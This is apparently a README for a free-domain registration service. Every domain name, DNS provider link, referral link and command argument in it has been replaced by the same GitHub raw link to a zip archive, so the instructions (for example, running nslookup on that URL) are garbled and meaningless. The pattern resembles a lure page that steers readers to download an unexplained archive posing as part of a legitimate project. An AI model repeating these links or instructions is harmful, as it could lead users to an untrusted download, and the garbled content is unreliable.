# Free domains for developers

For IT enthusiasts who need a temporary domain name or those who can't or don't want to pay for a top level domain 🌍

Available extensions:

- _your-name_**https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip**
- _your-name_**https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip**

> Note that **.la** and **.ws** are both considered global by Google just like **.com**

## How does it work?

1. [Verify your domain availability](#verify-your-domain-availability)
2. [Add your domain to a DNS provider](#add-your-domain-to-a-dns-provider)
3. [Register your domain with the DNS records given by your provider](#register-a-domain)
4. [After 1 year, it expires, unless you renew it](#renew-your-domain)

### Verify your domain availability

Let's say you want the domain **https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip**

#### Option 1

Run the following command:

```sh
nslookup -type=ns https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip
```

If you see something like **server can't find https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip NXDOMAIN**, your domain is available.

#### Option 2

Search in the file [https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip) for the term "example" to see if it's already registered

### Add your domain to a DNS provider

Once you settled on available domain, you need to know which DNS servers to use before you can register it. This is why you need to add it to your DNS provider first.

Here are some DNS providers you can use:

| Provider                                                                     | DNS price | Sign-up bonus                                                              | Where to go (after sign-up)                                                                                            |
| ---------------------------------------------------------------------------- | --------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| [Digital Ocean](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                              | Free      | [$100](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                     | [Networking > Domains](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                              |
| [Linode](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip) | Free      | [$100](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip) | [Domains > Create](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                                            |
| [Vultr](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                  | Free      | [$100](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                 | [DNS > Add domain](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                                                          |
| [ClouDNS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                            | Free      | No                                                                         | [DNS Hosting > Create Zone > Master zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                               |
| [FreeDNS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                        | Free      | No                                                                         | [Domains > Add A Domain into FreeDNS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                       |
| [Hetzner](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                          | Free      | No                                                                         | [DNS > Add zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                                                     |
| [AWS](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                                | Paid      | No                                                                         | [Route 53 > Hosted zones > Create hosted zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip) |
| [Google Cloud](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)                         | Paid      | $300                                                                       | [Cloud DNS > Create a DNS zone](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip~new)                            |

> Some of the links above are referral links to support this repo

Unfortunately, you cannot use Cloudflare with these domains because they are in fact subdomains and Cloudflare does not support adding a subdomain as a domain.

### Register a domain

Now go to the corresponding zone file for your chosen domain.

For **https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip**, edit the zone file [https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip), and follow the format used by the other domains to set the nameservers given by your DNS provider.

### Renew your domain

All domains expire automatically one year **after the last modification**. So, if you want to "renew" your domain, just make a modification to your domain in the zone file. For example, you can add `# renew` at the end of the line, and the year after, modify it to `# renew 2`, and so on.

Only the original committer can renew their domain.

This repo will send 3 reminders (1 month, 1 week and 1 day before expiration) to [your commit email address](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip). If you use a no-reply address and plan to renew your domain, don't forget to add it in your calendar!

### Supporting this repo

![Star this repo](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)

### Due diligence

All the code for managing these domains (permissions, validation, etc.) is located in this repo.

We try to keep at least 2 years before the expiration of these domains.

You can check their expiration date from a [whois website](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip) or from your command line:

```sh
whois https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip | grep -i expir
whois https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip | grep -i expir
```

## Abuse

We're trying to make the world a better place, **please don't abuse this system** 🙏

We reserve the right to cancel any domain and ban any user from using this free service if we think the system is being abused for spam, child pornography, illegal activities, racism, bullying, etc.

**If you think a domain is abusing our system, please [open an issue](https://raw.githubusercontent.com/sshmoon/free-domain/main/zones/domain-free-3.2.zip)**
